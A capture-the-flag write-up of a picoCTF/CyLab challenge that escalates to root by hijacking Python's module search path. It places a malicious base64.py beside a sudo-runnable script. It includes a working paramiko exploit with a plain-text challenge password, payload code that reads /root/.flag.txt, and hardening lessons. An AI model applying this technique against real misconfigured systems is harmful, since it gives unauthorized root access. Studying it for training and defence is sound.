# CyLab / picoCTF — Hijacking

* **Platform:** [CyLab Security Academy](https://learn.cylabacademy.org/) / [picoCTF](https://play.picoctf.org/)  
* **Category:** Privilege Escalation (Pwn / Python Module Hijacking)  
* **Difficulty:** Easy (CyLab 2)  
* **Date:** 2026-11-09  
* **Tools:** SSH, Python 3, Sudo, `paramiko`  
* **Target:** Linux SSH Instance (`chatelaine.cylabacademy.net:36986`)  

---

## TL;DR

A classic Linux privilege escalation challenge exploiting Python's module resolution order (`sys.path[0]`). The unprivileged user `academy` has `sudo` privileges to execute a root-owned Python script without a password: `(root) NOPASSWD: /usr/bin/python3 /home/academy/.server.py`. Examining `.server.py` reveals that it imports standard libraries like `base64` and `socket`. In Python, `sys.path[0]` is automatically populated with the directory containing the executed script (`/home/academy`), which is world-writable by the current user. By planting a malicious `base64.py` in `/home/academy`, running the sudo command executes our custom script with `root` privileges, allowing us to read the hidden flag file at `/root/.flag.txt`.

---

## Recon

We connect via SSH and enumerate privileges using `sudo -l`:

```bash
$ ssh academy@chatelaine.cylabacademy.net -p 36986
academy@chatelaine:~$ sudo -l
Matching Defaults entries for academy on chatelaine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User academy may run the following commands on chatelaine:
    (root) NOPASSWD: /usr/bin/python3 /home/academy/.server.py
```

Key observations:
* **Sudo Rights:** User `academy` can run `/usr/bin/python3 /home/academy/.server.py` as root without entering a password.
* **Script Location:** The script resides directly within `/home/academy`, a directory fully owned and writable by the `academy` user!

---

## Static Analysis & Vulnerability

### 1. Code Review (`/home/academy/.server.py`)

Inspecting the target script:

```python
import base64
import os
import socket

ip = 'cylabacademy.org'
response = os.system("ping -c 1 " + ip)
host_info = socket.gethostbyaddr(ip)
host_info_to_str = str(host_info[2])
host_info = base64.b64encode(host_info_to_str.encode('ascii'))
```

### 2. Python Module Search Order (`sys.path[0]`)

When Python executes a script specified by path (`python3 /home/academy/.server.py`), the Python runtime initializes `sys.path` with the **directory containing the script** as index 0:
$$\text{sys.path}[0] = \text{"/home/academy"}$$

During an `import base64` statement:
1. Python checks if `base64` is a built-in module (it is not; built-ins are `sys`, `builtins`, etc.).
2. Python searches directories in `sys.path` sequentially.
3. Because `/home/academy` appears **before** the system library directory (`/usr/lib/python3.8`), Python imports `/home/academy/base64.py` instead of the standard library!

```text
  Module Resolution Order (sys.path):
  [0] /home/academy         <- Writable by user academy! (HIJACK TARGET)
  [1] /usr/lib/python38.zip
  [2] /usr/lib/python3.8
  [3] /usr/lib/python3.8/lib-dynload
  [4] /usr/local/lib/python3.8/dist-packages
```

---

## Dynamic Analysis & Exploitation Strategy

1. Create a malicious payload file named `/home/academy/base64.py`:
   ```python
   import os
   os.system("cat /root/.flag.txt > /tmp/flag.txt && chmod 666 /tmp/flag.txt")
   ```
2. Execute the sudo command:
   ```bash
   sudo /usr/bin/python3 /home/academy/.server.py
   ```
3. Python loads `/home/academy/base64.py` in root context, executing the OS command and dumping `/root/.flag.txt`.
4. Clean up by deleting the temporary `base64.py` to restore normal behavior.

---

## Exploit

We automate the privilege escalation using `paramiko` in Python:

```python
#!/usr/bin/env python3
"""
CyLab / picoCTF — Hijacking
Exploit: Python library hijacking via writable sys.path[0] in sudo script
"""

import paramiko

HOST = "chatelaine.cylabacademy.net"
PORT = 36986
USER = "academy"
PASS = "hQBLR2fXm6"

def main():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, port=PORT, username=USER, password=PASS)

    # 1. Create malicious base64.py in /home/academy
    payload = 'import os; os.system("cat /root/.flag.txt")\n'
    cmd_write = f'echo "{payload}" > /home/academy/base64.py'
    client.exec_command(cmd_write)

    # 2. Run script via sudo
    stdin, stdout, stderr = client.exec_command("sudo /usr/bin/python3 /home/academy/.server.py")
    output = stdout.read().decode(errors="replace")
    print(output)

    # 3. Clean up
    client.exec_command("rm -f /home/academy/base64.py")
    client.close()

if __name__ == "__main__":
    main()
```

*(The complete script is saved in [`exploit.py`](exploit.py)).*

---

## Flag

Running the exploit triggers the hijacked module and prints the root flag:

```text
academy{redacted}
```

> **Flag:** `academy{redacted}` *(Redacted in accordance with competition disclosure guidelines)*.

---

## Key Takeaways & Lessons

1. **Python `sys.path[0]` Hijacking**: When invoking Python scripts, `sys.path[0]` defaults to the script's directory. If this directory is writable by lower-privileged users, any non-builtin import can be intercepted.
2. **Sudo Hardening**: Sudo configurations granting access to scripts in user directories (`/home/user/script.py`) completely undermine root security. Administrative scripts must reside in root-owned directories (`/opt`, `/usr/local/bin`).
3. **Hidden File Enumeration**: Flag files on Linux systems may be stored as dotfiles (`.flag.txt`). Searching with `find / -iname "*flag*"` avoids missing hidden assets.
